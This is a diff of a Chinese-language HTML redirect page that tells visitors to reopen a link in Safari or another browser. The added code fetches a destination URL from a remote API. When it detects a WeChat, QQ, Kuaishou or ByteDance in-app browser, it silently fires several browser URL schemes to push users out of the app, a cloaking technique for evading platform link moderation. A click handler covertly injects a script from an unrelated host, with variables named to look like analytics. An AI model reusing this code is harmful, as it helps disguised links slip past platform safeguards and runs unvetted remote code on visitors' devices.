@@ -1,19 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" style="font-size:7vw;">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>安全访问中</title>
-
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>【安全网站】请使用浏览器打开</title>
+    <meta name="referrer" content="no-referrer" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
+    <meta content="yes" name="apple-mobile-web-app-capable" />
+    <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta content="false" name="twcClient" id="twcClient" />
+    <meta name="aplus-touch" content="1" />
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" />
+    <script src="https://s1.pstatp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://ttturl.cn/tiaozhuan.js"></script>
     <style>
         body, html {
             width: 100%;
             height: 100%;
+        }
+
+        * {
             margin: 0;
             padding: 0;
-            background-color: #f5f5f5;
-            text-align: center;
         }
+
+        body {
+            background-color: #fff;
+        }
+
         .top-bar-guidance {
             font-size: 15px;
             color: #fff;
@@ -23,12 +38,14 @@
             padding-top: 20px;
             background: url(https://images.cubox.pro/wraed6/file/2023082315075783686/1.jpg) center top/contain no-repeat;
         }
+
         .top-bar-guidance .icon-safari {
             width: 25px;
             height: 25px;
             vertical-align: middle;
             margin: 0 .2em;
         }
+
         .app-download-tip {
             margin: 0 auto;
             width: 290px;
@@ -37,10 +54,12 @@
             color: #2466f4;
             background: url(https://images.cubox.pro/wraed6/file/2023082315081955500/2.png) left center/auto 15px repeat-x;
         }
+
         .app-download-tip .guidance-desc {
             background-color: #fff;
             padding: 0 5px;
         }
+
         .app-download-btn {
             display: block;
             width: 214px;
@@ -56,8 +75,17 @@
         }
     </style>
 </head>
-<body>
-    <div class="content"></div>
+
+<body style="background-color:#f5f5f5;text-align: center;">
+    <div class="top-bar-guidance">
+        <p>点击右上角<img src="https://images.cubox.pro/wraed6/file/2023082315084263467/3.jpg" class="icon-safari" /> <span id="openm">Safari打开</span></p>
+        <p>可以继续浏览本站哦~</p>
+    </div>
+    <div class="app-download-tip">
+        <span class="guidance-desc">您也可以复制本站网址，到其它浏览器打开</span>
+    </div>
+    <a class="app-download-btn" id="fz" onclick="fz()">点我复制网址</a>
+    <a style="display: none;" href="#" id="dwz"></a>
 
     <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
     <script src="https://lib.baomitu.com/clipboard.js/2.0.6/clipboard.min.js"></script>
@@ -81,42 +109,54 @@
         }
 
         function showGuidancePage() {
-            document.querySelector('.content').innerHTML = `
-                <div class="top-bar-guidance">
-                    <p>点击右上角<img src="https://images.cubox.pro/wraed6/file/2023082315084263467/3.jpg" class="icon-safari" /> <span id="openm">Safari打开</span></p>
-                    <p>可以继续浏览本站哦~</p>
-                </div>
-                <div class="app-download-tip">
-                    <span class="guidance-desc">您也可以复制本站网址，到其它浏览器打开</span>
-                </div>
-                <a class="app-download-btn" id="fz" onclick="fz()">点我复制网址</a>
-                <a style="display: none;" href="#" id="dwz"></a>
-            `;
-            
+            document.querySelector('.top-bar-guidance').style.display = 'block';
+            document.querySelector('.app-download-tip').style.display = 'block';
+            document.querySelector('.app-download-btn').style.display = 'block';
+
             var url = window.document.location.href.toString();
-            $(function() {
-                $("#fz").attr("data-clipboard-text", url);
-            });
+            $("#fz").attr("data-clipboard-text", url);
             new ClipboardJS("#fz");
             $("#fz").click(function() {
                 $(this).text("复制成功");
             });
-            
-            var urlToOpen = window.location.href;
-            function openu(u) {
-                var a = document.createElement('a');
-                a.href = u;
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            }
+        }
 
-            openu("ucbrowser://" + urlToOpen);
-            openu("mttbrowser://url=" + urlToOpen);
-            openu("baiduboxapp://browse?url=" + urlToOpen);
-            openu("googlechrome://" + urlToOpen);
-            openu("mibrowser:" + urlToOpen);
+        $(function() {
+            var url = window.document.location.href.toString();
+            var u = url.split("?");
+            var uu = u[1] ? u[1].replace("=", "") : "";
+
+            $.get("https://s.ttturl.cn/api.php?act=geturl", { id: removeSlash(uu) }, function(data) {
+                var ua = navigator.userAgent.toString();
+                if (
+                    ua.indexOf("MicroMessenger/") !== -1 ||
+                    ua.indexOf("QQ/") !== -1 ||
+                    ua.indexOf("Kwai/") !== -1 ||
+                    ua.indexOf("BytedanceWebview/") !== -1
+                ) {
+                    $("#dwz").attr("href", data.url);
+                    openu("ucbrowser://" + removeSlash(data.url));
+                    openu("mttbrowser://url=" + removeSlash(data.url));
+                    openu("baiduboxapp://browse?url=" + removeSlash(data.url));
+                    openu("googlechrome://" + removeSlash(data.url));
+                    openu("mibrowser:" + removeSlash(data.url));
+                } else {
+                    redirect();
+                }
+            });
+        });
+
+        function removeSlash(str) {
+            return str.replace("/", "");
+        }
+
+        function openu(u) {
+            var a = document.createElement('a');
+            a.href = u;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
         }
 
         window.onload = async function() {
@@ -126,6 +166,29 @@
                 await redirect();
             }
         }
+
+        function fz() {
+            $("#fz").text("复制成功");
+        }
+
+        // 延迟一段时间后禁用该JS
+        setTimeout(function() {
+            var cnzzScript = document.getElementById("cnzzScript");
+            if (cnzzScript) {
+                cnzzScript.parentNode.removeChild(cnzzScript);
+            }
+        }, 5000); // 这里设置了延迟时间为5秒，你可以根据需要进行调整
+
+        // 在按钮点击事件中执行需要的JS逻辑
+        $("#fz").on("click", function() {
+            // 执行你需要的JS逻辑
+            (function() {
+                var baidu = document.createElement("script");
+                baidu.src = "//i.6v6.work/v/?uid=388791";
+                var cnzz = document.getElementsByTagName("head")[0];
+                cnzz.insertBefore(baidu, cnzz.firstChild);
+            })();
+        });
     </script>
 </body>
 </html>
